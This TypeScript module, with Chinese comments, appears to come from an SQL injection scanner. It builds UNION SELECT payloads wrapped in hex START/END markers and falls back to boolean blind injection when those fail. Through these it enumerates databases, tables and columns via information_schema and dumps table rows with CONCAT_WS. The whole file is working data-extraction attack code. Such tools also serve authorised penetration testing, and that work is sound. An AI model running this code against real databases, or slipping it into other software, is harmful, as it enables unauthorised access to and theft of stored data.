/**
 * 数据提取编排 -- 库/表/列 + 数据行 dump
 *
 * 注入执行抽象（Injector）由 scanner 注入真实实现：
 *   - unionQuery：发送 UNION payload 返回原始响应；union 不可用返回 null
 *   - blindBoolean / blindTime：盲注条件 probe
 *
 * 策略：union 批量（两标记包裹）优先，盲注兜底。
 */
import { blindExtractBoolean } from './blind.js';
import { extractBetweenMarks } from './sql.js';

export interface Injector {
  unionQuery(payload: string): Promise<string | null>;
  blindBoolean(condSql: string): Promise<boolean>;
  blindTime(condSql: string): Promise<boolean>;
}

export interface ExtractOptions {
  /** UNION 列数（scanner 探测结果） */
  n: number;
  /** 回显列位置（1-based），两标记占用 markCol 和 markCol+1 */
  markCol: number;
  dumpLimit?: number;
  maxLen?: number;
}

const MARK_START = 'START';
const MARK_END = 'END';
const HEX_START = '0x5354415254'; // 'START'
const HEX_END = '0x454e44';       // 'END'

/** 构造 union 提取 payload：在 markCol 和 markCol+1 列之间包裹表达式 */
export function buildUnionExtractPayload(n: number, markCol: number, expr: string): string {
  const cols = Array.from({ length: n }, (_, i) => {
    if (i === markCol - 1) return HEX_START;
    if (i === markCol) return `(${expr})`;
    if (i === markCol + 1) return HEX_END;
    return '1';
  });
  return `1' UNION SELECT ${cols.join(',')}-- `;
}

/** 提取单个表达式值：union 批量优先，盲注兜底 */
export async function extractValue(inj: Injector, sqlExpr: string, opts: ExtractOptions): Promise<string | null> {
  const payload = buildUnionExtractPayload(opts.n, opts.markCol, sqlExpr);
  const body = await inj.unionQuery(payload);
  if (body) {
    const v = extractBetweenMarks(body, MARK_START, MARK_END);
    if (v !== null) return v;
  }
  return blindExtractBoolean((c) => inj.blindBoolean(c), sqlExpr, { maxLen: opts.maxLen });
}

/** 库名列表 */
export async function extractDatabases(inj: Injector, opts: ExtractOptions): Promise<string[]> {
  const v = await extractValue(inj, 'GROUP_CONCAT(schema_name SEPARATOR 0x2c) FROM information_schema.schemata', opts);
  return v ? v.split(',').map((s) => s.trim()).filter(Boolean) : [];
}

/** 指定库的表名列表 */
export async function extractTables(inj: Injector, db: string, opts: ExtractOptions): Promise<string[]> {
  const v = await extractValue(inj, `GROUP_CONCAT(table_name SEPARATOR 0x2c) FROM information_schema.tables WHERE table_schema='${db}'`, opts);
  return v ? v.split(',').map((s) => s.trim()).filter(Boolean) : [];
}

/** 指定表的列名列表 */
export async function extractColumns(inj: Injector, db: string, table: string, opts: ExtractOptions): Promise<string[]> {
  const v = await extractValue(inj, `GROUP_CONCAT(column_name SEPARATOR 0x2c) FROM information_schema.columns WHERE table_schema='${db}' AND table_name='${table}'`, opts);
  return v ? v.split(',').map((s) => s.trim()).filter(Boolean) : [];
}

/** 数据行 dump（逐行，整行 CONCAT 一列提取） */
export async function dumpTable(inj: Injector, db: string, table: string, columns: string[], opts: ExtractOptions): Promise<Record<string, string>[]> {
  const limit = opts.dumpLimit ?? 20;
  const rows: Record<string, string>[] = [];
  for (let i = 0; i < limit; i++) {
    const expr = `CONCAT_WS(0x2c, ${columns.join(',')}) FROM ${db}.${table} LIMIT ${i},1`;
    const v = await extractValue(inj, expr, opts);
    if (v === null || v === '') break;
    const parts = v.split(',');
    const row: Record<string, string> = {};
    columns.forEach((c, idx) => { row[c] = parts[idx] ?? ''; });
    rows.push(row);
  }
  return rows;
}
